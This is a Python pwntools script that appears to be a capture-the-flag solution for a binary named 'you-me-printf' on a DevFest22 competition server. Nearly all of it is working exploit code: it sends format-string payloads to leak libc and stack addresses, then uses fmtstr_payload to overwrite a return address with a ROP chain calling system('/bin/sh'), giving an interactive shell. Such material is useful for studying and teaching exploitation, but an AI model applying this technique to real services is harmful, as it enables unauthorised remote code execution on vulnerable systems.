#!/usr/bin/env python3

from pwn import *

exe = ELF("./you-me-printf")
libc = exe.libc

HOST, PORT = "devfest22-cybersec.gdgalgiers.com", 1402

context.binary = exe
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

# Constants

GDBSCRIPT = '''\
'''
CHECKING = True

MAXSIZE = 512
LIBC_LEAK_OFFSET = libc.sym.read + 18
PRINTF_RETADDR_OFFSET = 0x340
LIBC_LEAK_PRINTF_OFFSET = 3
STACK_LEAK_PRINTF_OFFSET = 77
PRINTF_CONTROL_OFFSET = 6

def main():
    global io

    io = conn()

    # Leak libc and stack

    payload = f"%{LIBC_LEAK_PRINTF_OFFSET}$p|%{STACK_LEAK_PRINTF_OFFSET}$p\0".encode()
    io.recvuntil(b"? ")
    io.send(payload)
    leaks = io.recvuntil(b"Anything", drop=True).split(b'|')
    libc_leak = int(leaks[0], 16)
    stack_leak = int(leaks[1], 16)
    libc.address = leak(pack(libc_leak), LIBC_LEAK_OFFSET, "libc")
    printf_retaddr = leak(pack(stack_leak), PRINTF_RETADDR_OFFSET, "(stack) read return")

    roplibc = ROP(libc)
    pop_rdi = roplibc.rdi.address
    ret = roplibc.ret.address

    # Overwrite future return address of read with a ROP chain

    writes = {
        printf_retaddr: pop_rdi,
        printf_retaddr + 0x8: next(libc.search(b"/bin/sh\0")),
        printf_retaddr + 0x10: libc.sym.system,
    }
    payload = fmtstr_payload(
        offset=PRINTF_CONTROL_OFFSET,
        writes=writes,
        write_size="byte",
    )
    assert(len(payload) <= MAXSIZE)
    log.info(f"Payload: {payload}")
    io.recvuntil(b"? ")
    io.send(payload)

    io.interactive()

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
